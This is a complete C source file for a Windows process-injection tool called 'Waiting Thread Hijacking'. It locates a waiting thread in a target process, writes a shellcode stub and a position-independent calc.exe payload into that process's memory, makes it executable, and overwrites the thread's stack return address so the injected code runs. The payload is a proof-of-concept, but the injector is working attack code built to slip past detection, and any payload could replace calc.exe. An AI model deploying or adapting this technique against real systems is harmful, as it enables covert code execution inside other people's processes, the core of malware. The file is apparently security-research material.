#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")

// NT Structures and Definitions
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#ifndef SystemProcessInformation
#define SystemProcessInformation 5
#endif

// Thread state constant - Waiting
#ifndef Waiting
#define Waiting 5
#endif

// Wait reason constant - WrQueue
#ifndef WrQueue
#define WrQueue 15
#endif

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// Official shellcode from hasherezade/waiting_thread_hijacking
// Stub: saves/restores registers, calls payload, jumps back to original return address
unsigned char g_shellcode_stub[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  // placeholder for original return address
    // the actual code starts here (offset: 8)
    0x66, 0x9C, 0x50, 0x51,  // pushf, push rax, push rcx
    0x52, 0x53, 0x55, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,  // push all
    0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0xE8, 0x1F, 0x00,  // call payload
    0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B,  // pop all
    0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59,  // pop all
    0x58, 0x66, 0x9D, 0xFF, 0x25, 0xBB, 0xFF, 0xFF, 0xFF  // popf, jmp [rip-0x45]
};

// WinExec("calc.exe", SW_SHOW) shellcode
unsigned char g_shellcode_pop_calc[] = {
    // the main function of the shellcode:
    0x56, 0x48, 0x8B, 0xF4, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20,
    0xE8, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xE6, 0x5E, 0xC3, 0x48, 0x83,
    0xEC, 0x38, 0xE8, 0x20, 0x00, 0x00, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x72,
    0x00, 0x6E, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E,
    0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x59, 0xE8, 0x8F, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44,
    0x24, 0x20, 0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x07, 0xB8, 0x01,
    0x00, 0x00, 0x00, 0xEB, 0x46, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x57, 0x69,
    0x6E, 0x45, 0x78, 0x65, 0x63, 0x00, 0x5A, 0x48, 0x8B, 0x4C, 0x24, 0x20,
    0xE8, 0x33, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x83,
    0x7C, 0x24, 0x28, 0x00, 0x75, 0x07, 0xB8, 0x04, 0x00, 0x00, 0x00, 0xEB,
    0x1A, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x09, 0x00, 0x00, 0x00, 0x63,
    0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x59, 0xFF, 0x54, 0x24,
    0x28, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x89, 0x54, 0x24,
    0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x8B,
    0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48,
    0x8B, 0x44, 0x24, 0x30, 0x0F, 0xB7, 0x00, 0x3D, 0x4D, 0x5A, 0x00, 0x00,
    0x74, 0x07, 0x33, 0xC0, 0xE9, 0xFA, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44,
    0x24, 0x30, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
    0x40, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x40, 0x48, 0x8D, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x83, 0x38, 0x00,
    0x75, 0x07, 0x33, 0xC0, 0xE9, 0xB2, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44,
    0x24, 0x38, 0x8B, 0x00, 0x89, 0x44, 0x24, 0x18, 0x8B, 0x44, 0x24, 0x18,
    0x48, 0x03, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
    0x10, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44,
    0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x1C, 0x89, 0x44,
    0x24, 0x24, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x20, 0x89, 0x44,
    0x24, 0x1C, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x24, 0x89, 0x44,
    0x24, 0x20, 0x48, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0xEB,
    0x0D, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44,
    0x24, 0x08, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x39, 0x44, 0x24, 0x08,
    0x0F, 0x83, 0x3B, 0x01, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x1C, 0x48, 0x8B,
    0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
    0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x8D, 0x04, 0x88, 0x48, 0x89, 0x44,
    0x24, 0x58, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
    0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24,
    0x08, 0x48, 0x8D, 0x04, 0x48, 0x48, 0x89, 0x44, 0x24, 0x50, 0x8B, 0x44,
    0x24, 0x24, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03,
    0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x0F, 0xB7, 0x09,
    0x48, 0x8D, 0x04, 0x88, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x44,
    0x24, 0x58, 0x8B, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
    0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
    0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x04,
    0x24, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x8B, 0x04, 0x24,
    0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
    0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x45, 0x48, 0x8B, 0x04,
    0x24, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
    0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x2F, 0x48, 0x8B, 0x04, 0x24, 0x48,
    0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
    0xC1, 0x0F, 0xBE, 0x00, 0x48, 0x8B, 0x0C, 0x24, 0x48, 0x8B, 0x54, 0x24,
    0x28, 0x48, 0x03, 0xD1, 0x48, 0x8B, 0xCA, 0x0F, 0xBE, 0x09, 0x3B, 0xC1,
    0x74, 0x02, 0xEB, 0x02, 0xEB, 0x97, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B,
    0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
    0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x75, 0x2D, 0x48, 0x8B, 0x04, 0x24, 0x48,
    0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE,
    0x00, 0x85, 0xC0, 0x75, 0x17, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x8B, 0x00,
    0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
    0x8B, 0xC1, 0xEB, 0x07, 0xE9, 0xA8, 0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0x48,
    0x83, 0xC4, 0x78, 0xC3, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC,
    0x58, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x89,
    0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x40, 0x18,
    0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x83,
    0xC0, 0x20, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x38,
    0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0xEB, 0x0D, 0x48, 0x8B,
    0x44, 0x24, 0x30, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48,
    0x8B, 0x44, 0x24, 0x38, 0x48, 0x39, 0x44, 0x24, 0x30, 0x0F, 0x84, 0xBF,
    0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0xE8, 0x10,
    0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x74,
    0x0C, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x83, 0x78, 0x30, 0x00, 0x75,
    0x05, 0xE9, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48,
    0x8B, 0x40, 0x60, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x83, 0x7C, 0x24,
    0x10, 0x00, 0x75, 0x02, 0xEB, 0xA4, 0x48, 0xC7, 0x04, 0x24, 0x00, 0x00,
    0x00, 0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xFF, 0xC0, 0x48,
    0x89, 0x04, 0x24, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x0F, 0xB7, 0x40, 0x58,
    0x48, 0x39, 0x04, 0x24, 0x0F, 0x83, 0x26, 0x01, 0x00, 0x00, 0x48, 0x8B,
    0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85,
    0xC0, 0x74, 0x11, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24,
    0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0, 0x75, 0x05, 0xE9, 0xFF, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7,
    0x04, 0x48, 0x83, 0xF8, 0x5A, 0x7F, 0x47, 0x48, 0x8B, 0x44, 0x24, 0x60,
    0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x41, 0x7C,
    0x35, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7,
    0x04, 0x48, 0x83, 0xE8, 0x41, 0x83, 0xC0, 0x61, 0x89, 0x44, 0x24, 0x20,
    0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x54,
    0x24, 0x20, 0x66, 0x89, 0x14, 0x48, 0x0F, 0xB7, 0x44, 0x24, 0x20, 0x66,
    0x89, 0x44, 0x24, 0x08, 0xEB, 0x12, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48,
    0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x66, 0x89, 0x44, 0x24, 0x08,
    0x0F, 0xB7, 0x44, 0x24, 0x08, 0x66, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8B,
    0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83,
    0xF8, 0x5A, 0x7F, 0x47, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C,
    0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x41, 0x7C, 0x35, 0x48, 0x8B,
    0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83,
    0xE8, 0x41, 0x83, 0xC0, 0x61, 0x89, 0x44, 0x24, 0x24, 0x48, 0x8B, 0x44,
    0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x54, 0x24, 0x24, 0x66,
    0x89, 0x14, 0x48, 0x0F, 0xB7, 0x44, 0x24, 0x24, 0x66, 0x89, 0x44, 0x24,
    0x0A, 0xEB, 0x12, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24,
    0x0F, 0xB7, 0x04, 0x48, 0x66, 0x89, 0x44, 0x24, 0x0A, 0x0F, 0xB7, 0x44,
    0x24, 0x0A, 0x66, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xB7, 0x44, 0x24, 0x18,
    0x0F, 0xB7, 0x4C, 0x24, 0x1C, 0x3B, 0xC1, 0x74, 0x02, 0xEB, 0x05, 0xE9,
    0xBC, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C,
    0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0, 0x75, 0x1C, 0x48, 0x8B, 0x44,
    0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0,
    0x75, 0x0B, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x40, 0x30, 0xEB,
    0x07, 0xE9, 0x24, 0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x58,
    0xC3
};

// Helper: Check if return address points to ntdll/kernel32/kernelbase
// Uses the fact that system DLLs are loaded at the same address in all processes (ASLR session-wide)
// So we can check the address in the current (injector) process instead of the target process
BOOL IsValidReturnTarget(HANDLE hProcess, PVOID retAddr) {
    // Check if address is in current process (injector process)
    // System DLLs like ntdll.dll, kernel32.dll, kernelbase.dll are loaded at the same address
    // in all processes within the same Windows session due to ASLR
    HMODULE hMod = NULL;

    // GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: get module containing the address
    // GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT: don't increment reference count
    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCSTR)retAddr,
                            &hMod)) {
        printf("[-] Return address 0x%llx not in any module\n", (ULONGLONG)retAddr);
        return FALSE;
    }

    // Get module name
    char modName[MAX_PATH];
    if (!GetModuleBaseNameA(GetCurrentProcess(), hMod, modName, sizeof(modName))) {
        printf("[-] Failed to get module name\n");
        return FALSE;
    }

    printf("[*] Return address 0x%llx in module: %s\n", (ULONGLONG)retAddr, modName);

    // Check if it's a system DLL
    if (_stricmp(modName, "ntdll.dll") == 0 ||
        _stricmp(modName, "kernel32.dll") == 0 ||
        _stricmp(modName, "kernelbase.dll") == 0) {
        printf("[+] Valid system DLL target!\n");
        return TRUE;
    }

    printf("[-] Return address not in ntdll/kernel32/kernelbase\n");
    return FALSE;
}

// Helper: Enumerate threads and find suitable waiting thread
BOOL FindWaitingThread(DWORD pid, DWORD waitReason, DWORD* outTid, ULONGLONG* outRsp, ULONGLONG* outRetAddr) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtQuerySystemInformation NtQuerySystemInformation =
        (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return FALSE;

    // Allocate buffer for process information
    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status;

    do {
        buffer = malloc(bufferSize);
        if (!buffer) return FALSE;

        ULONG returnLength = 0;
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            free(buffer);
            bufferSize = returnLength;
            continue;
        }
        break;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (status != STATUS_SUCCESS) {
        free(buffer);
        return FALSE;
    }

    // Find our process
    PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    BOOL found = FALSE;

    while (TRUE) {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == pid) {
            printf("[*] Found process, analyzing %lu threads\n", procInfo->NumberOfThreads);

            // Open process
            HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
            if (!hProcess) {
                printf("[-] Failed to open process: %lu\n", GetLastError());
                break;
            }

            // Get pointer to thread array (immediately after SYSTEM_PROCESS_INFORMATION)
            PSYSTEM_THREAD_INFORMATION threadInfo = (PSYSTEM_THREAD_INFORMATION)(procInfo + 1);

            // Check each thread
            for (ULONG i = 0; i < procInfo->NumberOfThreads; i++) {

                if (threadInfo->ThreadState == Waiting) {
                    DWORD tid = (DWORD)(ULONG_PTR)threadInfo->ClientId.UniqueThread;

                    printf("[*] TID %lu: State=Waiting, WaitReason=%lu\n", tid, threadInfo->WaitReason);

                    // Check wait reason if specified
                    if (waitReason != 0xFFFFFFFF && threadInfo->WaitReason != waitReason) {
                        continue;
                    }

                    // Open thread and get context
                    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
                    if (!hThread) {
                        printf("[-] Failed to open thread %lu\n", tid);
                        continue;
                    }

                    CONTEXT ctx = {0};
                    ctx.ContextFlags = CONTEXT_FULL;

                    if (!GetThreadContext(hThread, &ctx)) {
                        printf("[-] Failed to get thread context: %lu\n", GetLastError());
                        CloseHandle(hThread);
                        continue;
                    }

                    CloseHandle(hThread);

                    // Read return address from stack
                    ULONGLONG retAddr = 0;
                    SIZE_T bytesRead = 0;

                    if (!ReadProcessMemory(hProcess, (PVOID)ctx.Rsp, &retAddr, sizeof(retAddr), &bytesRead) ||
                        bytesRead != sizeof(retAddr)) {
                        printf("[-] Failed to read return address from stack\n");
                        continue;
                    }

                    printf("[*] RSP: 0x%llx, Return address: 0x%llx\n", ctx.Rsp, retAddr);

                    // Validate return address
                    if (IsValidReturnTarget(hProcess, (PVOID)retAddr)) {
                        printf("[+] Found suitable thread: TID %lu\n", tid);
                        *outTid = tid;
                        *outRsp = ctx.Rsp;
                        *outRetAddr = retAddr;
                        found = TRUE;
                        break;
                    }
                }

                // Move to next thread
                threadInfo++;
            }

            CloseHandle(hProcess);
            break;
        }

        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)procInfo + procInfo->NextEntryOffset);
    }

    free(buffer);
    return found;
}

// Main injection function
BOOL InjectWaitingThread(DWORD pid, DWORD waitReason) {
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Wait reason filter: %lu (0xFFFFFFFF = any)\n", waitReason);

    // Find suitable waiting thread
    DWORD tid = 0;
    ULONGLONG rsp = 0;
    ULONGLONG originalRetAddr = 0;

    if (!FindWaitingThread(pid, waitReason, &tid, &rsp, &originalRetAddr)) {
        printf("[-] No suitable waiting thread found\n");
        return FALSE;
    }

    printf("[+] Target thread found: TID %lu\n", tid);
    printf("[+] RSP: 0x%llx\n", rsp);
    printf("[+] Original return address: 0x%llx\n", originalRetAddr);

    // Open process
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process: %lu\n", GetLastError());
        return FALSE;
    }

    // Calculate total shellcode size
    // Official shellcode structure: stub (59 bytes) + calc payload (659 bytes)
    SIZE_T totalSize = sizeof(g_shellcode_stub) + sizeof(g_shellcode_pop_calc);

    // Allocate memory in target process
    PVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, totalSize,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteShellcode) {
        printf("[-] Failed to allocate memory in target process: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Allocated shellcode at: 0x%llx (size: %llu bytes)\n",
           (ULONGLONG)pRemoteShellcode, (ULONGLONG)totalSize);

    // Build complete shellcode
    BYTE* fullShellcode = (BYTE*)malloc(totalSize);
    if (!fullShellcode) {
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T offset = 0;

    // 1. Copy stub (with placeholder for original return address at offset 0)
    memcpy(fullShellcode + offset, g_shellcode_stub, sizeof(g_shellcode_stub));
    offset += sizeof(g_shellcode_stub);

    // 2. Copy calc payload (no patching needed - uses PEB walking to resolve WinExec)
    memcpy(fullShellcode + offset, g_shellcode_pop_calc, sizeof(g_shellcode_pop_calc));

    // 3. Write original return address to the first 8 bytes (placeholder in stub)
    //    The stub's jmp [rip-0x45] will jump back to this address
    memcpy(fullShellcode, &originalRetAddr, sizeof(originalRetAddr));

    // Write shellcode to target process
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, fullShellcode, totalSize, &bytesWritten) ||
        bytesWritten != totalSize) {
        printf("[-] Failed to write shellcode: %lu\n", GetLastError());
        free(fullShellcode);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    free(fullShellcode);

    printf("[+] Shellcode written successfully\n");

    // Make shellcode executable
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemoteShellcode, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Failed to make shellcode executable: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode is now executable\n");

    // Calculate shellcode entry point (skip the saved return address)
    ULONGLONG shellcodeEntry = (ULONGLONG)pRemoteShellcode + 8;

    // Overwrite return address on stack
    if (!WriteProcessMemory(hProcess, (PVOID)rsp, &shellcodeEntry, sizeof(shellcodeEntry), &bytesWritten) ||
        bytesWritten != sizeof(shellcodeEntry)) {
        printf("[-] Failed to overwrite return address on stack: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Return address overwritten!\n");
    printf("[+] Shellcode will execute when thread returns\n");

    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("Waiting Thread Hijacking\n");
    printf("========================================\n\n");

    if (argc < 2) {
        printf("Usage: %s <PID> [wait_reason]\n", argv[0]);
        printf("\nWait reasons:\n");
        printf("  15 = WrQueue (default)\n");
        printf("  0xFFFFFFFF = Any wait reason\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    DWORD waitReason = WrQueue;  // Default to WrQueue

    if (argc > 2) {
        waitReason = strtoul(argv[2], NULL, 0);
    }

    if (InjectWaitingThread(pid, waitReason)) {
        printf("\n[+] Injection successful!\n");
        printf("[*] Wait for the target thread to return from its waiting state\n");
        return 0;
    } else {
        printf("\n[-] Injection failed!\n");
        return 1;
    }
}
